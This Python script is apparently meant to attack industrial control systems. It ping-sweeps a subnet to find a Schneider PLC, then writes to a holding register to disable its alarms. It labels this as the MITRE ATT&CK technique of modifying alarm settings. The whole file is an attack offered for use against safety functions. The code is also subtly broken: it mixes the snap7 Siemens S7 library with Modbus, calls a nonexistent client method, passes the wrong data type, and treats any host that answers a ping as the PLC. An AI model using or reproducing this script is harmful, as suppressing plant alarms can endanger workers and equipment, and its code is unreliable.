import snap7
import struct
import time
import socket

# Configuration
PLC_IP = None  # Will be discovered dynamically
RACK = 0
SLOT = 1
MODBUS_TCP_PORT = 502 #Standard Modbus TCP Port.
MODBUS_UNIT_ID = 1 # Default Unit ID
ALARM_SUPPRESSION_REGISTER = 40001  # Example Holding Register Address
ALARM_SUPPRESSION_VALUE = 1       # Example Value to disable alarms (adjust according to your system)
SCAN_IP_NETWORK = "192.168.9.0/24"   # Network to scan for PLC
# Function to discover Schneider PLC IP address using broadcast ping (UDP)
def discover_plc_ip(network_prefix):
    """
    Discovers the Schneider PLC IP address on the specified network.

    Args:
        network_prefix (str): The network prefix in CIDR notation (e.g., "192.168.1.0/24").

    Returns:
        str: The PLC IP address if found, otherwise None.
    """

    try:
        # Extract base IP and subnet mask from CIDR notation
        base_ip, subnet_length = network_prefix.split('/')
        subnet_length = int(subnet_length)

        # Calculate the number of hosts
        num_hosts = 2**(32 - subnet_length)

        # Convert the base IP to an integer
        base_ip_int = struct.unpack("!I", socket.inet_aton(base_ip))[0]

        # Iterate through possible IP addresses
        for i in range(1, num_hosts - 1):  # Exclude network and broadcast addresses
            ip_int = base_ip_int + i
            ip_address = socket.inet_ntoa(struct.pack("!I", ip_int))

            # Ping each IP address
            try:
                # Create a raw socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(0.5)  # Set a timeout for the ping

                # Build the ICMP packet
                icmp_type = 8  # ICMP Echo Request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = 12345
                icmp_seq = 1
                icmp_data = b"This is a ping packet"

                # Pack the ICMP header
                icmp_packet = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + icmp_data

                # Calculate the checksum (simplified for demonstration)
                icmp_checksum = calculate_checksum(icmp_packet)

                # Repack the ICMP header with the checksum
                icmp_packet = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + icmp_data

                # Send the ping packet
                sock.sendto(icmp_packet, (ip_address, 1))

                # Wait for a response
                start_time = time.time()
                while time.time() - start_time < 0.5:
                    try:
                        _, addr = sock.recvfrom(1024)
                        if addr[0] == ip_address:
                            print(f"PLC found at IP address: {ip_address}")
                            return ip_address
                    except socket.timeout:
                        pass
                    except socket.error as e:
                        print(f"Socket error: {e}")
                        break

            except socket.error as e:
                print(f"Socket error: {e}")
                continue
            finally:
                if 'sock' in locals():
                    sock.close()

    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None

    return None  # PLC not found


def calculate_checksum(packet):
    """
    Calculates the checksum for an ICMP packet.
    """
    if len(packet) % 2 != 0:
        packet += b'\0'
    res = sum(struct.unpack("!{}H".format(len(packet) // 2), packet))
    res = (res >> 16) + (res & 0xffff)
    res += res >> 16
    return (~res) & 0xffff

def write_modbus_register(plc_ip, register, value):
    """Writes to a Modbus holding register."""
    try:
        # Create a Modbus TCP client
        client = snap7.client.Client()
        client.set_as_tcp_client(plc_ip, MODBUS_TCP_PORT)
        client.connect(plc_ip, RACK, SLOT)
        client.db_write(1, register , value)
        # Close the connection
        client.disconnect()
        print(f"Successfully wrote value {value} to register {register} on PLC {plc_ip}")

    except Exception as e:
        print(f"Error writing to Modbus register: {e}")
        return False
    return True


def main():
    global PLC_IP
    # Discover the PLC IP address
    PLC_IP = discover_plc_ip(SCAN_IP_NETWORK)

    if PLC_IP is None:
        print("PLC IP address not found.  Exiting.")
        return

    print(f"Using PLC IP address: {PLC_IP}")

    # Implement the MITRE ATT&CK Technique T0448: Inhibit Response Function - Modify Alarm Settings
    print("Attempting to modify alarm settings...")
    if write_modbus_register(PLC_IP, ALARM_SUPPRESSION_REGISTER, ALARM_SUPPRESSION_VALUE):
        print("Alarm settings modified successfully.")
    else:
        print("Failed to modify alarm settings.")


if __name__ == "__main__":
    main()